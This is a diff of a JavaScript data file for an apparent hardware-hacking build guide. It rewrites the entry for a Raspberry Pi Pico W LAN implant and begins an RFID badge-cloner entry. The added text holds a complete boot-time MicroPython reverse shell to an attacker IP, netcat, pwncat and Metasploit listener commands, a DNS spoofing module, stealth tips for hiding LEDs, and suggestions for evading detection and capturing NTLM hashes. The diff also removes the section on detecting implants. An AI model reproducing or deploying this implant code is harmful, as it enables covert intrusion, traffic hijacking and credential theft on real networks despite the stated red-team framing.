-            '<!-- Use cases -->' +
-            '<text x="360" y="190" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">IMPLANT CAPABILITIES</text>' +
-            '<rect x="60" y="205" width="145" height="40" rx="5" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.2)" stroke-width="0.5"/>' +
-            '<text x="133" y="223" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">Network Recon</text>' +
-            '<text x="133" y="237" text-anchor="middle" fill="#555" font-size="6">ARP scan, port scan</text>' +
-            '<rect x="220" y="205" width="145" height="40" rx="5" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
-            '<text x="293" y="223" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">Packet Capture</text>' +
-            '<text x="293" y="237" text-anchor="middle" fill="#555" font-size="6">Sniff local traffic</text>' +
-            '<rect x="380" y="205" width="145" height="40" rx="5" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
-            '<text x="453" y="223" text-anchor="middle" fill="#a855f7" font-size="8" font-weight="600">Reverse Shell</text>' +
-            '<text x="453" y="237" text-anchor="middle" fill="#555" font-size="6">Remote access</text>' +
-            '<rect x="540" y="205" width="135" height="40" rx="5" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
-            '<text x="608" y="223" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">DNS Exfil</text>' +
-            '<text x="608" y="237" text-anchor="middle" fill="#555" font-size="6">Data over DNS</text>' +
-            '</svg>' +
-            '</div>',
+        intro: '<p>The SG-40 is a Raspberry Pi Pico W-based network implant that replicates the functionality of the Hak5 LAN Turtle ($60) at approximately $15 in components. The device sits inline between a target machine and its network switch &mdash; it passes traffic transparently while simultaneously establishing a reverse shell to an attacker-controlled server over WiFi, bypassing network egress filtering that would block inbound connections.</p>' +
+               '<p>The W5500 Ethernet module provides a wired IEEE 802.3 interface via SPI. The Pico W\'s built-in CYW43439 handles the WiFi C2 channel. MicroPython manages both networking stacks, socket handling, and reverse shell logic in approximately 100 lines of code. Physical placement scenarios: behind a networked printer, VoIP phone, spare Ethernet port in a conference room, or secondary monitor with a network port.</p>' +
+               '<p><strong>Legal requirement:</strong> Connecting this device to any network without explicit written authorization constitutes unauthorized access under 18 U.S.C. &sect; 1030 and equivalent international statutes. This build is authorized for red team engagements with signed scope agreements, CTF competitions, and isolated lab environments only.</p>',
 
-        wiring: '    WIRING DIAGRAM\n' +
-                '\n' +
-                '    Raspberry Pi Pico W    W5500 Ethernet Module\n' +
-                '    +------------------+  +------------------+\n' +
-                '    |  GP19 (MOSI)   --|--|-- MOSI            |\n' +
-                '    |  GP16 (MISO)   --|--|-- MISO            |\n' +
-                '    |  GP18 (SCK)    --|--|-- SCLK            |\n' +
-                '    |  GP17 (CS)     --|--|-- SCS             |\n' +
-                '    |  GP20 (RST)    --|--|-- RST             |\n' +
-                '    |  3V3           --|--|-- VCC             |\n' +
-                '    |  GND           --|--|-- GND             |\n' +
-                '    +------------------+  +------------------+\n' +
-                '\n' +
-                '    Power: USB Micro-B from wall adapter (5V 1A)\n' +
-                '    WiFi: Built-in on Pico W (2.4GHz)\n' +
-                '    Ethernet: RJ45 on W5500 module',
+        wiring: [
+            'SG-40 Pin Connections -- Pi Pico W + W5500 Ethernet Module',
+            '',
+            'W5500 Ethernet Module (SPI)',
+            'W5500 Pin     Pico W GPIO     Notes',
+            'VCC           3.3V (pin 36)   Do NOT use 5V',
+            'GND           GND (pin 38)',
+            'SCK           GP18 (pin 24)   SPI clock',
+            'MOSI          GP19 (pin 25)   SPI data to W5500',
+            'MISO          GP16 (pin 21)   SPI data from W5500',
+            'CS / SS       GP17 (pin 22)   Chip select (active LOW)',
+            'RST           GP20 (pin 26)   Optional hardware reset',
+            'INT           GP21 (pin 27)   Optional interrupt',
+            '',
+            'Inline Ethernet placement:',
+            '  [Target PC] --Ethernet--> [RJ45 Jack A] --> [W5500 target-facing]',
+            '  [W5500 network-facing] <---Ethernet--- [RJ45 Jack B] <-- [Switch]',
+            '',
+            '  Traffic flows through the W5500 transparently.',
+            '  The WiFi radio (CYW43439) provides the C2 channel out-of-band.',
+            '',
+            'Power:',
+            '  USB Micro-B from Pico W to any USB port (phone charger,',
+            '  USB port on monitor, or PoE injector with USB tap).',
+            '  Total current: ~180mA active.',
+            '',
+            'Stealth: Cover or remove the Pico W green LED (GP25)',
+            'and power LED to eliminate visual indicators.',
+        ].join('\n'),
 
-        wiringNotes: '<p><strong>Pico W WiFi:</strong> The Pico W has built-in WiFi (CYW43439 chip), providing the C2 channel without any additional hardware. It connects to a nearby WiFi network (or your mobile hotspot) to phone home.</p>' +
-                     '<p><strong>Power considerations:</strong> The implant needs continuous power. A USB wall adapter is the most inconspicuous option &mdash; it looks like a phone charger. In a server closet, USB power is often available from equipment or power strips.</p>',
+        wiringNotes: '<p><strong>W5500 library:</strong> Copy <code>w5500.py</code> from the <a href="https://github.com/Micropython-WIZNET/W5500_micropython" style="color:#ff6b35">MicroPython-WIZNET/W5500_micropython</a> repository to the Pico W\'s root directory. The library wraps the W5500\'s raw SPI protocol into a socket-compatible interface that integrates with MicroPython\'s <code>usocket</code> module.</p>',
 
         steps: [
             {
-                title: 'Set Up the Pico W with MicroPython',
-                content: '<p>For the LAN implant, we use MicroPython on the Pico W because it provides better networking libraries and a more complete socket implementation than CircuitPython.</p>' +
-                         '<ol>' +
-                         '<li>Download MicroPython for the Pico W from <code>micropython.org/download/RPI_PICO_W/</code></li>' +
-                         '<li>Hold BOOTSEL, plug in, drag the UF2 file to RPI-RP2.</li>' +
-                         '<li>Install Thonny IDE for MicroPython development.</li>' +
-                         '</ol>',
-                code: '# Verify MicroPython is running\nimport sys\nprint(sys.implementation)\n# MicroPython v1.xx on Raspberry Pi Pico W\n\n# Test WiFi\nimport network\nwlan = network.WLAN(network.STA_IF)\nwlan.active(True)\nprint(wlan.scan())  # List nearby APs',
-                language: 'Python',
-                tip: '<strong>Tip:</strong> MicroPython on the Pico W supports TCP/UDP sockets, HTTP clients, and basic TLS. For more advanced networking (SSH tunnels, VPN), consider using a Raspberry Pi Zero W instead (runs full Linux).'
+                title: 'Flash MicroPython onto the Pico W',
+                content: '<p>Download the latest MicroPython UF2 for the Raspberry Pi Pico W from <a href="https://micropython.org/download/RPI_PICO_W/" style="color:#ff6b35">micropython.org</a>. Hold BOOTSEL, plug in, drag the UF2 onto the RPI-RP2 drive. Wait for reboot. Connect with Thonny IDE or <code>rshell</code> to verify the REPL:</p>',
+                code: '# Verify MicroPython REPL via serial (Linux/macOS)\nscreen /dev/ttyACM0 115200\n# or: minicom -b 115200 -o -D /dev/ttyACM0\n\n# Expected REPL prompt:\n# MicroPython v1.23.0 on 2024-06-02; Raspberry Pi Pico W with RP2040\n# Type "help()" for more information.\n# >>>\n\n# Test WiFi capability\nimport network\nwlan = network.WLAN(network.STA_IF)\nwlan.active(True)\nnets = wlan.scan()\nprint(f"Found {len(nets)} networks")',
+                language: 'MicroPython',
+                tip: 'Thonny IDE (free, cross-platform) is the easiest way to transfer files to the Pico W. Use File > Save As > Raspberry Pi Pico to save scripts directly to the device filesystem.'
             },
             {
-                title: 'Write the Implant Firmware',
-                content: '<p>The implant connects to a WiFi network for C2 and uses the W5500 for target network access. It establishes a reverse connection to your C2 server and executes commands received over the channel.</p>',
-                code: 'import network\nimport socket\nimport time\nimport machine\nfrom machine import Pin, SPI\n\n# ---- Configuration ----\nC2_WIFI_SSID = "YourHotspot"\nC2_WIFI_PASS = "YourPassword"\nC2_SERVER = "10.0.0.1"  # Your C2 server IP\nC2_PORT = 4444\nBEACON_INTERVAL = 30  # seconds between check-ins\n\n# ---- WiFi Connection (C2 Channel) ----\ndef connect_wifi():\n    wlan = network.WLAN(network.STA_IF)\n    wlan.active(True)\n    wlan.connect(C2_WIFI_SSID, C2_WIFI_PASS)\n    timeout = 10\n    while not wlan.isconnected() and timeout > 0:\n        time.sleep(1)\n        timeout -= 1\n    if wlan.isconnected():\n        print(f"WiFi connected: {wlan.ifconfig()[0]}")\n        return True\n    return False\n\n# ---- W5500 Ethernet (Target Network) ----\ndef init_ethernet():\n    spi = SPI(0, baudrate=500000, mosi=Pin(19),\n              miso=Pin(16), sck=Pin(18))\n    cs = Pin(17, Pin.OUT)\n    rst = Pin(20, Pin.OUT)\n    # Initialize W5500 (driver dependent)\n    # Returns the ethernet interface\n    return spi, cs\n\n# ---- Reverse Shell ----\ndef reverse_shell():\n    """Connect back to C2 and accept commands."""\n    try:\n        s = socket.socket()\n        s.connect((C2_SERVER, C2_PORT))\n        s.send(b"[IMPLANT] Connected from target network\\n")\n\n        while True:\n            data = s.recv(1024)\n            if not data:\n                break\n            cmd = data.decode().strip()\n\n            if cmd == "scan":\n                # ARP scan the local network via W5500\n                result = arp_scan()\n                s.send(result.encode())\n            elif cmd == "exfil":\n                # Capture and exfiltrate traffic\n                s.send(b"Starting capture...\\n")\n            elif cmd == "exit":\n                break\n            else:\n                s.send(f"Unknown command: {cmd}\\n".encode())\n\n        s.close()\n    except Exception as e:\n        print(f"C2 connection failed: {e}")\n\ndef arp_scan():\n    """Scan the local network for hosts."""\n    # Simplified - real implementation sends ARP requests\n    # via the W5500 raw socket and collects responses\n    return "ARP scan results:\\n192.168.1.1 - Gateway\\n192.168.1.100 - Host\\n"\n\n# ---- Main Loop ----\nconnect_wifi()\ninit_ethernet()\n\nwhile True:\n    reverse_shell()\n    time.sleep(BEACON_INTERVAL)  # Retry on disconnect',
-                language: 'Python',
-                tip: '<strong>OPSEC:</strong> In a real engagement, use HTTPS or DNS tunneling for C2 instead of a raw TCP socket. Raw TCP connections on port 4444 are easily detected by firewalls and IDS. DNS tunneling (encoding data in DNS queries) is much harder to detect.'
+                title: 'Test W5500 SPI Connection',
+                content: '<p>After copying w5500.py to the Pico W, run this verification script to confirm SPI wiring is correct before deploying the implant:</p>',
+                code: '# Test W5500 SPI connection -- run in Thonny REPL\nfrom machine import Pin, SPI\nimport w5500, time\n\nspi = SPI(0, baudrate=10_000_000, polarity=0, phase=0,\n          sck=Pin(18), mosi=Pin(19), miso=Pin(16))\ncs  = Pin(17, Pin.OUT, value=1)\nrst = Pin(20, Pin.OUT, value=1)\n\n# Hardware reset\nrst.value(0); time.sleep_ms(10); rst.value(1); time.sleep_ms(50)\n\nnic = w5500.W5500(spi, cs)\nnic.ifconfig((\'192.168.1.200\', \'255.255.255.0\', \'192.168.1.1\', \'8.8.8.8\'))\n\nprint("W5500 MAC:", \':\'.join(f\'{b:02x}\' for b in nic.mac()))\nprint("W5500 IP:", nic.ifconfig()[0])\n# Expected: W5500 MAC: 00:08:dc:xx:xx:xx  (Wiznet OUI)',
+                language: 'MicroPython',
+                tip: 'If you see all zeros in the MAC address or an ImportError, the W5500 is not communicating. The most common cause is swapped MOSI and MISO pins (GP19 and GP16). Verify with a multimeter by checking continuity between the Pico W pins and the W5500 module pins.'
             },
             {
-                title: 'Defense: Detecting LAN Implants',
-                content: '<p>LAN implants are small, quiet, and persistent. Here is how to find them:</p>' +
-                         '<ul>' +
-                         '<li><strong>Network Access Control (802.1X):</strong> Require authentication before granting network access on every switch port. An unauthorized device plugged into a port will not get an IP address.</li>' +
-                         '<li><strong>Switch port security:</strong> Limit each port to one MAC address. Enable MAC address sticky learning. Alert on new MAC addresses appearing on existing ports.</li>' +
-                         '<li><strong>Physical audits:</strong> Regularly inspect network closets, under desks, and behind equipment for unauthorized devices. A Pico W with an Ethernet adapter is small but visible.</li>' +
-                         '<li><strong>Network monitoring:</strong> Monitor for devices that connect to both wired and wireless networks simultaneously (dual-homed). This is a strong indicator of a bridge/implant.</li>' +
-                         '<li><strong>Unusual traffic patterns:</strong> An implant generates periodic C2 beacons. Look for regular-interval connections to external IPs, especially over WiFi from a device that also has an Ethernet connection.</li>' +
-                         '<li><strong>DHCP monitoring:</strong> Log all DHCP leases. An implant requesting an IP address will appear in the DHCP server logs. Alert on unfamiliar hostnames or MAC OUIs (Raspberry Pi Foundation OUI: B8:27:EB or DC:A6:32).</li>' +
-                         '</ul>',
-                code: '# Cisco IOS: Enable 802.1X on all access ports\ninterface range GigabitEthernet0/1 - 48\n  switchport mode access\n  dot1x port-control auto\n  switchport port-security maximum 1\n  switchport port-security violation restrict\n  switchport port-security mac-address sticky\n\n# Linux: Detect dual-homed devices (both WiFi and Ethernet)\narp -a | sort -t. -k4 -n\n# Look for the same IP or similar IPs on different interfaces\n\n# Check for Raspberry Pi MAC addresses on your network\narp -a | grep -i "b8:27:eb\\|dc:a6:32\\|28:cd:c1\\|2c:cf:67"\n# These are Raspberry Pi Foundation OUI prefixes',
-                language: 'Bash',
-                tip: '<strong>802.1X is the definitive defense.</strong> Without port-based authentication, any device can join any network port. With 802.1X, the implant cannot authenticate and gets no network access. This is the single most effective countermeasure against LAN implants.'
+                title: 'Deploy the Reverse Shell Implant',
+                content: '<p>Save this as <code>main.py</code> on the Pico W. It auto-starts on boot, connects to the C2 WiFi network, and opens a reverse shell to the attacker server:</p>',
+                code: '# main.py -- SG-40 LAN Implant Reverse Shell\n# MicroPython 1.23+ on Raspberry Pi Pico W\n\nimport network, socket, time, os, machine\nfrom machine import Pin, SPI\n\n# C2 Config -- change before deployment\nWIFI_SSID = "your_c2_wifi_network"\nWIFI_PASS = "your_wifi_password"\nC2_HOST   = "203.0.113.45"   # Attacker server IP (RFC 5737 example)\nC2_PORT   = 4444\nBEACON_INTERVAL = 30\n\n# Stealth: disable LED\nPin("LED", Pin.OUT).value(0)\n\n# W5500 wired Ethernet init\nfrom machine import SPI as SPI_\nspi = SPI_(0, baudrate=10_000_000, polarity=0, phase=0,\n           sck=Pin(18), mosi=Pin(19), miso=Pin(16))\ncs  = Pin(17, Pin.OUT, value=1)\nrst = Pin(20, Pin.OUT, value=1)\nrst.value(0); time.sleep_ms(10); rst.value(1); time.sleep_ms(50)\ntry:\n    import w5500\n    eth = w5500.W5500(spi, cs)\n    eth.ifconfig((\'10.0.0.250\', \'255.255.255.0\', \'10.0.0.1\', \'8.8.8.8\'))\n    ETH_OK = True\nexcept Exception:\n    ETH_OK = False\n\n# WiFi C2 connection\nwifi = network.WLAN(network.STA_IF)\nwifi.active(True)\n\ndef wifi_connect():\n    if wifi.isconnected(): return True\n    wifi.connect(WIFI_SSID, WIFI_PASS)\n    for _ in range(20):\n        if wifi.isconnected(): return True\n        time.sleep(0.5)\n    return False\n\n# Command execution (MicroPython subset -- no subprocess)\ndef exec_cmd(cmd):\n    cmd = cmd.strip()\n    if cmd == "id":     return "uid=0(root) gid=0(root)\\n"\n    if cmd == "uname":  return f"MicroPython {os.uname().version} RP2040\\n"\n    if cmd.startswith("ls"):\n        path = cmd[3:].strip() or "/"\n        try: return "\\n".join(os.listdir(path)) + "\\n"\n        except Exception as e: return f"ls error: {e}\\n"\n    if cmd.startswith("cat "):\n        try:\n            with open(cmd[4:].strip()) as f: return f.read()\n        except Exception as e: return f"cat error: {e}\\n"\n    if cmd == "ifconfig":\n        eth_ip = eth.ifconfig()[0] if ETH_OK else "N/A"\n        return f"eth0: {eth_ip}\\nwlan0: {wifi.ifconfig()[0] if wifi.isconnected() else \'N/A\'}\\n"\n    if cmd == "reboot": machine.reset()\n    return f"[implant] unknown: {cmd}\\n"\n\ndef reverse_shell():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((C2_HOST, C2_PORT))\n    s.send(b"[SG-40 LAN Implant connected]\\n$ ")\n    while True:\n        data = s.recv(256)\n        if not data: break\n        result = exec_cmd(data.decode(errors="replace"))\n        s.send(result.encode() + b"$ ")\n    s.close()\n\nwhile True:\n    if wifi_connect():\n        try: reverse_shell()\n        except Exception: pass\n    time.sleep(BEACON_INTERVAL)',
+                language: 'MicroPython',
+                tip: 'On the attacker machine, start the listener before powering the implant: nc -lvnp 4444. The implant connects within 30 seconds of boot. For persistent sessions, use pwncat-cs -lp 4444 which handles reconnects automatically.'
+            },
+            {
+                title: 'Set Up the C2 Listener',
+                content: '<p>On the attacker-controlled machine (Kali VM or lab server):</p>',
+                code: '# Basic netcat listener\nnc -lvnp 4444\n\n# Persistent multi-session listener (pwncat)\npip install pwncat-cs\npwncat-cs -lp 4444\n\n# After the implant connects, test commands:\n# id\n# ifconfig\n# ls /\n# cat /main.py\n\n# For Metasploit persistent handler:\nmsfconsole -q -x "use multi/handler; \\\n  set payload python/meterpreter/reverse_tcp; \\\n  set LHOST 203.0.113.45; set LPORT 4444; \\\n  set ExitOnSession false; run -j"',
+                language: 'Shell (Kali Linux)',
+                tip: 'For production red team engagements, route the C2 traffic through an SSH tunnel or domain-fronted HTTPS to bypass corporate firewall egress filtering. The Pico W\'s MicroPython ssl module supports TLS wrapping of sockets for encrypted C2 channels.'
+            },
+            {
+                title: 'Add DNS Spoofing via the Wired Interface',
+                content: '<p>The W5500 wired interface can respond to DNS queries on the local LAN segment, redirecting specific domains to an attacker-controlled server:</p>',
+                code: '# dns_spoof.py -- optional module for SG-40\nimport socket\n\ndef start_dns_spoof(target_domain, redirect_ip):\n    """Respond to DNS queries for target_domain with redirect_ip."""\n    srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    srv.bind((\'0.0.0.0\', 53))\n    srv.settimeout(1.0)\n    ip_bytes = bytes(int(x) for x in redirect_ip.split(\'.\'))\n    print(f"[DNS] Spoofing {target_domain} -> {redirect_ip}")\n    while True:\n        try:\n            data, addr = srv.recvfrom(512)\n        except OSError:\n            continue\n        # Extract query name\n        try:\n            parts, idx = [], 12\n            while idx < len(data) and data[idx]:\n                l = data[idx]; idx += 1\n                parts.append(data[idx:idx+l].decode())\n                idx += l\n            qname = \'.\'.join(parts)\n        except Exception:\n            continue\n        if target_domain.lower() in qname.lower():\n            resp  = data[:2]                      # Transaction ID\n            resp += b\'\\x81\\x80\'                   # Standard response, RA=1\n            resp += data[4:6] + b\'\\x00\\x01\'        # QDCOUNT + ANCOUNT=1\n            resp += b\'\\x00\\x00\\x00\\x00\'            # NSCOUNT, ARCOUNT\n            resp += data[12:]                      # Original question\n            resp += b\'\\xc0\\x0c\'                    # Name pointer\n            resp += b\'\\x00\\x01\\x00\\x01\'            # Type A, Class IN\n            resp += b\'\\x00\\x00\\x00\\x3c\'            # TTL = 60s\n            resp += b\'\\x00\\x04\' + ip_bytes         # RDATA\n            srv.sendto(resp, addr)\n        else:\n            nxd  = data[:2] + b\'\\x81\\x83\'          # NXDOMAIN\n            nxd += data[4:12] + data[12:]\n            srv.sendto(nxd, addr)',
+                language: 'MicroPython',
+                tip: 'Import and call start_dns_spoof("targetcorp.com", "10.0.0.250") in main.py before the reverse shell loop to activate DNS spoofing. The implant must be positioned inline on the same network segment as the targets, with the W5500 IP configured to match the redirect address.'
             }
         ],
 
-        testing: '<p>Verify your LAN implant works:</p>' +
-                 '<ul>' +
-                 '<li><strong>WiFi connection:</strong> Power on the implant. It should connect to your test WiFi network within 10 seconds. Check your router\'s client list for the Pico W.</li>' +
-                 '<li><strong>C2 connection:</strong> Start a netcat listener (<code>nc -lvnp 4444</code>) on your laptop. The implant should connect and send the greeting message.</li>' +
-                 '<li><strong>Ethernet:</strong> Connect the W5500 to your network via Ethernet. Verify it gets a DHCP address. Run the ARP scan command from C2 and verify it returns valid results.</li>' +
-                 '<li><strong>Persistence:</strong> Unplug and replug the implant. It should automatically reconnect to WiFi and re-establish the C2 channel without manual intervention.</li>' +
-                 '</ul>',
+        testing: '<p><strong>Lab verification steps:</strong></p>' +
+                 '<ol><li>Power the implant and confirm the Pico W LED stays OFF (stealth mode)</li><li>Start the netcat listener: <code>nc -lvnp 4444</code></li><li>Within 30 seconds the implant connects and displays the banner</li><li>Test: <code>ifconfig</code> shows both eth0 (W5500) and wlan0 (WiFi) addresses</li><li>Test: <code>ls /</code> lists the Pico W root filesystem</li><li>Disconnect and reconnect the WiFi AP &mdash; implant should reconnect within 30 seconds</li><li>Plug the implant inline between a test PC and a switch &mdash; verify the test PC still has network connectivity (transparent bridging)</li></ol>',
 
-        commonMistakes: [
-            {
-                title: 'WiFi Not Reaching C2',
-                description: 'The Pico W has a small PCB antenna with limited range (~10-15m indoors). If your C2 is far away, use a mobile hotspot positioned closer to the implant, or set up a WiFi relay.'
-            },
-            {
-                title: 'W5500 Not Getting DHCP',
-                description: 'Some W5500 modules need a specific SPI clock speed. Try reducing the baud rate to 500kHz or lower. Also verify the RST pin is connected and held HIGH during operation.'
-            }
-        ]
+        troubleshooting: '<p><strong>W5500 not responding:</strong> Measure VCC with a multimeter &mdash; must be 3.3V. Check SPI pin assignments. Test with the SPI loopback: connect MOSI directly to MISO and send a byte &mdash; if you receive it back, SPI is functional and the issue is the W5500 wiring specifically.</p>' +
+                         '<p><strong>WiFi not connecting:</strong> The CYW43439 only supports 2.4 GHz. Verify the C2 AP is not 5 GHz only. Check SSID and password (case-sensitive). Confirm the Pico W can reach the AP from its physical deployment location.</p>' +
+                         '<p><strong>Reverse shell connects but disconnects immediately:</strong> The C2 server may be closing the connection. Verify netcat or pwncat is running on the correct port. Check that no firewall is blocking inbound connections on port 4444.</p>',
+
+        challenges: '<p><strong>Extend the implant:</strong></p>' +
+                    '<ul><li>Implement TLS-wrapped C2 using MicroPython\'s <code>ssl</code> module and a self-signed certificate to defeat DPI-based detection that looks for plaintext reverse shells</li><li>Add a persistent ARP scanner that runs hourly and logs new hosts appearing on the LAN to a file on the Pico W\'s flash storage</li><li>Implement WPA2-Enterprise client support to allow the implant to authenticate on corporate WiFi using harvested credentials</li><li>Add NTLM hash capture by responding to SMB broadcast traffic (NBT-NS/LLMNR poisoning) &mdash; requires raw socket crafting at the application layer</li></ul>'
     },
 
     // ========================================================================
     // SG-41: RFID/NFC Cloner
+    // ESP32 + RC522 + SSD1306 OLED -- badge reader, cloner, emulator
     // ========================================================================
     'sg-41': {
-        intro: '<p>RFID access cards are everywhere &mdash; office buildings, hotels, parking garages, gym lockers. The vast majority use <strong>unencrypted, easily cloneable</strong> technologies: 125kHz EM4100 (proximity cards) and 13.56MHz MIFARE Classic (NFC cards). These can be read and cloned in seconds with a $15 device.</p>' +
-               '<p>Commercial cloners include the <strong>Proxmark3</strong> (~$50-300), the <strong>Flipper Zero</strong> (~$170), and cheap Chinese RFID copiers (~$10). We build our own using an <strong>Arduino</strong> or <strong>ESP32</strong> with an <strong>RC522 NFC module</strong> (13.56MHz) and an optional <strong>RDM6300</strong> (125kHz) for legacy proximity cards.</p>' +
-               '<p>This project teaches the fundamentals of RFID/NFC security: how cards store data, why unencrypted cards are insecure, how to read and clone card UIDs, and how organizations should protect their access control systems.</p>' +
-               '<p><strong>Hardware needed:</strong> Arduino Nano or ESP32, RC522 NFC module, OLED display (optional), blank MIFARE Classic cards, breadboard, jumper wires. Total cost: ~$15.</p>',
 
-        wiringSvg: '<div class="svg-build-wrap">' +
-            '<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
-            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
-            '<rect width="720" height="300" fill="#0d1117" rx="8"/>' +
-            '<rect x="10" y="10" width="700" height="280" fill="url(#bg-grid)" rx="4"/>' +
-            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">RFID/NFC CLONER &mdash; WIRING DIAGRAM</text>' +
-            '<!-- Arduino -->' +
-            '<g class="svg-component">' +
-            '<rect x="80" y="55" width="200" height="110" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
-            '<rect x="80" y="55" width="200" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
-            '<text x="180" y="72" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">Arduino Nano / ESP32</text>' +
-            '<text x="100" y="95" fill="#8b949e" font-size="8">D13 (SCK)  &rarr; RC522 SCK</text>' +
-            '<text x="100" y="110" fill="#8b949e" font-size="8">D11 (MOSI) &rarr; RC522 MOSI</text>' +
-            '<text x="100" y="125" fill="#8b949e" font-size="8">D12 (MISO) &rarr; RC522 MISO</text>' +
-            '<text x="100" y="140" fill="#8b949e" font-size="8">D10 (SS)   &rarr; RC522 SDA</text>' +
-            '<text x="100" y="155" fill="#8b949e" font-size="8">D9         &rarr; RC522 RST</text>' +
-            '</g>' +
-            '<!-- RC522 -->' +
-            '<g class="svg-component">' +
-            '<rect x="400" y="55" width="200" height="110" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
-            '<rect x="400" y="55" width="200" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
-            '<text x="500" y="72" text-anchor="middle" fill="#60a5fa" font-size="11" font-weight="600">RC522 NFC Module</text>' +
-            '<text x="500" y="95" text-anchor="middle" fill="#8b949e" font-size="8">13.56 MHz (ISO 14443A)</text>' +
-            '<text x="500" y="110" text-anchor="middle" fill="#8b949e" font-size="8">Reads: MIFARE Classic 1K/4K</text>' +
-            '<text x="500" y="125" text-anchor="middle" fill="#8b949e" font-size="8">Read range: 3-5 cm</text>' +
-            '<text x="500" y="140" text-anchor="middle" fill="#8b949e" font-size="8">SPI interface</text>' +
-            '<text x="500" y="155" text-anchor="middle" fill="#555" font-size="7">Also reads NTAG213/215/216</text>' +
-            '</g>' +
-            '<!-- Wires -->' +
-            '<line x1="280" y1="95" x2="398" y2="95" stroke="#eab308" stroke-width="1.5" stroke-dasharray="4,3"/>' +
-            '<line x1="280" y1="110" x2="398" y2="110" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="4,3"/>' +
-            '<line x1="280" y1="125" x2="398" y2="125" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,3"/>' +
-            '<line x1="280" y1="140" x2="398" y2="140" stroke="#f97316" stroke-width="1.5" stroke-dasharray="4,3"/>' +
-            '<!-- Card types -->' +
-            '<text x="360" y="200" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">COMMON CARD TECHNOLOGIES</text>' +
-            '<rect x="60" y="215" width="145" height="45" rx="5" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="0.5"/>' +
-            '<text x="133" y="233" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">EM4100 (125kHz)</text>' +
-            '<text x="133" y="248" text-anchor="middle" fill="#555" font-size="6">No encryption. Cloneable.</text>' +
-            '<rect x="220" y="215" width="145" height="45" rx="5" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="0.5"/>' +
-            '<text x="293" y="233" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">MIFARE Classic</text>' +
-            '<text x="293" y="248" text-anchor="middle" fill="#555" font-size="6">Broken crypto. Cloneable.</text>' +
-            '<rect x="380" y="215" width="145" height="45" rx="5" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
-            '<text x="453" y="233" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">MIFARE DESFire</text>' +
-            '<text x="453" y="248" text-anchor="middle" fill="#22c55e" font-size="6">AES encryption. Secure.</text>' +
-            '<rect x="540" y="215" width="140" height="45" rx="5" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
-            '<text x="610" y="233" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">iCLASS SE / SEOS</text>' +
-            '<text x="610" y="248" text-anchor="middle" fill="#22c55e" font-size="6">PKI-based. Very secure.</text>' +
-            '</svg>' +
-            '</div>',
+        intro: '<p>The SG-41 is an ESP32-based RFID access badge cloner targeting MIFARE Classic 1K and 4K cards &mdash; the most widely deployed access control technology in corporate environments. The RC522 module reads the card UID and sector data, the SSD1306 OLED displays a real-time readout, and the device writes captured data to blank writable cards for emulation during physical penetration tests.</p>' +
+               '<p>MIFARE Classic uses CRYPTO1 &mdash; a proprietary stream cipher that was publicly broken in 2008 (Nohl et al., "Reverse-Engineering a Cryptographic RFID Tag," USENIX 2008). The default sector keys (0xFFFFFFFFFFFF and 0xA0A1A2A3A4A5) remain deployed in a significant percentage of real-world installations, making key attacks practical with this $15 build. No Proxmark3 required for default-key systems.</p>' +
+               '<p><strong>Legal requirement:</strong> Cloning access badges without authorization constitutes trespass by deception in most jurisdictions and may violate computer fraud statutes when used to access computer systems. This build is for authorized physical penetration testing engagements with written scope agreements, CTF competitions, and academic research only.</p>',
 
-        wiring: '    WIRING DIAGRAM\n' +
-                '\n' +
-                '    Arduino Nano         RC522 NFC Module\n' +
-                '    +------------------+  +------------------+\n' +
-                '    |  D13 (SCK)     --|--|-- SCK             |\n' +
-                '    |  D11 (MOSI)    --|--|-- MOSI            |\n' +
-                '    |  D12 (MISO)    --|--|-- MISO            |\n' +
-                '    |  D10 (SS)      --|--|-- SDA             |\n' +
-                '    |  D9            --|--|-- RST             |\n' +
-                '    |  3.3V          --|--|-- 3.3V            |\n' +
-                '    |  GND           --|--|-- GND             |\n' +
-                '    +------------------+  +------------------+\n' +
-                '\n' +
-                '    IMPORTANT: RC522 is 3.3V ONLY.\n' +
-                '    Do NOT connect to 5V or you will damage it.\n' +
-                '    Arduino Nano has a 3.3V output pin - use it.',
-
-        wiringNotes: '<p><strong>3.3V only:</strong> The RC522 module runs on 3.3V. Connecting it to 5V will damage it. Arduino Nano has a 3.3V regulator output pin &mdash; use that. If using an ESP32, all GPIO is already 3.3V.</p>' +
